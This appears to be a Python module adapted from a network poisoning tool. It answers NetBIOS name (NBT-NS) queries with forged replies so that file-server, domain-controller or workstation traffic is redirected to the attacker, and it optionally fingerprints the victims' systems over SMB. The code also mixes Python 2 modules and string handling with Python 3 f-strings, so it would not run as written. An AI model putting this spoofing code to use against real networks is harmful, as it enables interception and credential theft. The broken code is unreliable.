import fingerprint  
from packets import NBT_Ans  
from SocketServer import BaseRequestHandler  
from utils import *  

# Function to validate what type of NetBIOS name we are answering to
def Validate_NBT_NS(data):
    # If AnalyzeMode is enabled, we don't poison
    if settings.Config.AnalyzeMode:
        return False
    elif NBT_NS_Role(data[43:46]) == "File Server":
        return True
    elif settings.Config.NBTNSDomain:
        if NBT_NS_Role(data[43:46]) == "Domain Controller":
            return True
    elif settings.Config.Wredirect:
        if NBT_NS_Role(data[43:46]) == "Workstation/Redirector":
            return True
    return False

# NBT-NS Server class to handle incoming NBT-NS requests
class NBTNS(BaseRequestHandler):
    
    def handle(self):
        data, socket = self.request  # Get the incoming data and socket
        Name = Decode_Name(data[13:45])  # Decode the NetBIOS name from the request

        # List to store the NBT-NS poisoning or analysis results
        nbt_results = []

        # Check if we want to respond to this host (based on its address and name)
        if RespondToThisHost(self.client_address[0], Name) is not True:
            return None  # Exit if we do not want to respond

        # Check if the packet is a query message (identified by specific bytes)
        if data[2:4] == "\x01\x10":
            Finger = None  # Initialize fingerprint data to None
            # If fingerprinting is enabled, run SMB fingerprinting on the host
            if settings.Config.Finger_On_Off:
                Finger = fingerprint.RunSmbFinger((self.client_address[0], 445))

            # If AnalyzeMode is enabled, log the request without poisoning
            if settings.Config.AnalyzeMode:
                LineHeader = "[Analyze mode: NBT-NS]"  # Header for analysis mode logs
                # Log that the request is being ignored in AnalyzeMode
                nbt_results.append(f'{LineHeader} Request by {self.client_address[0]} for {Name}, ignoring')

            else:  # Poisoning Mode
                # Create a forged NBT-NS answer packet
                Buffer = NBT_Ans()
                Buffer.calculate(data)  # Calculate the final size and structure of the packet
                # Send the poisoned answer to the requesting host
                socket.sendto(str(Buffer), self.client_address)

                LineHeader = "[*] [NBT-NS]"  # Header for poisoning mode logs
                # Log that a poisoned answer has been sent
                nbt_results.append(f'{LineHeader} Poisoned answer sent to {self.client_address[0]} for name {Name} (service: {NBT_NS_Role(data[43:46])})')

            # If fingerprinting was done, add OS and Client version details to the results
            if Finger is not None:
                nbt_results.append(f'[FINGER] OS Version     : {Finger[0]}')
                nbt_results.append(f'[FINGER] Client Version : {Finger[1]}')

        return nbt_results  # Return the results to be passed to the HTML template